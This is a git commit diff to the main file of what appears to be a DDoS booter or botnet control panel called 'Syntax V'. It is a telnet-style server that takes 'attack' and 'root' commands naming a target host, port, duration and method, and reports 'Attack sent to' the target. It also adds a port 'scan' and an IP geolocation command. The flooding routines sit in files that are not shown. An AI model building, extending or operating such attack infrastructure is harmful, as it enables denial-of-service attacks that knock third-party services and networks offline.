1512e70e6d7288a274dc33119914899a2df22680
n4no <74839733+Preauthorized@users.noreply.github.com>
2021-05-01 21:25:20 -0400

    Update index.js

--- index.js
+++ index.js
@@ -15,8 +15,10 @@
 // Files
 const Server = require("./assets/Server/main.js");
 const ServerFunc = require("./assets/Server/ServerFunc.js");
+
 const Crud = require("./assets/Auth/crud.js");
 const Auth = require("./assets/Auth/main.js");
+const AuthFunc = require("./assets/Auth/functions.js");
 
 const Extra = require("./assets/Extra/main.js");
 
@@ -25,6 +27,8 @@ const Banner = require("./assets/banner_system/main.js");
 const Config = require("./assets/Config/main.js");
 const Current = require("./assets/Config/current.js");
 const ConfigFunc = require("./assets/Config/currentFunctions.js");
+
+const roots = require("./assets/root_system/main.js");
 
 var SIDs = [];
 var SessionID;
@@ -36,7 +40,7 @@ Server.Server.on('connection', async function(socket) {
     console.log('Client IP: ' + socket.remoteAddress.replace("::ffff:", "") + ":" + socket.remotePort + ' | IP4/IP6: ' + socket.remoteFamily);
     console.log('--------------------------------------------\r\n\r\n')
 
-    
+    ServerFunc.set_title("Syntax V", socket);
 
     var CurrentIP = socket.remoteAddress.replace("::ffff:", "");
 
@@ -57,6 +61,7 @@ Server.Server.on('connection', async function(socket) {
     Extra.MoveCursorToLeft(31, socket);
     Extra.MoveCursorUp(1, socket);
     socket.on('data', async function(chunk) {
+        socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
         Extra.MoveCursorDown(1, socket);
         // socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
 
@@ -64,19 +69,26 @@ Server.Server.on('connection', async function(socket) {
         console.log(cleanSTR);
 
         ConfigFunc.GetCmd(cleanSTR);
-        // let get_current = await Crud.GetCurrentUser(CurrentIP, "arr");
-        // let lul = await ConfigFunc.GetUserInfo(get_current[0]);
 
         if(cleanSTR.startsWith("clear")) {
             socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
         } else if(cleanSTR.startsWith("banner")) {
             socket.write(Banner.ModifyBanner("main") + "\r\n");
+        } else if(cleanSTR.startsWith("help" || "?")) {
+            socket.write(Banner.ModifyBanner("help"));
+        } else if(cleanSTR.startsWith("geo")) {
+            socket.write(await Extra.GeoIP(Current.CurrentCmd.arg[1]));
+        } else if(cleanSTR.startsWith("root")) {
+            let lul = roots.SendSSHCmd(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4])
+            socket.write("            Attack sent to: " + Current.CurrentCmd.arg[1] + ":" + Current.CurrentCmd.arg[2] + " for " + Current.CurrentCmd.arg[3] + " seconds with " + Current.CurrentCmd.arg[4] + "\r\n");
+        } else if(cleanSTR.startsWith("scan")) {
+            socket.write(await Extra.pScan(Current.CurrentCmd.arg[1]));
         } else if(cleanSTR.startsWith("attack")) {
             console.log(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4]);
             let attacking = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4]);
             socket.write(Banner.ModifyBanner("main") + attacking + "\r\n");
         }
-        socket.write(Banner.ModifyBanner("hostname"));
+        socket.write("\r\n" + Banner.ModifyBanner("hostname"));
         Extra.MoveCursorToLeft(31, socket);
         Extra.MoveCursorUp(1, socket);
     });
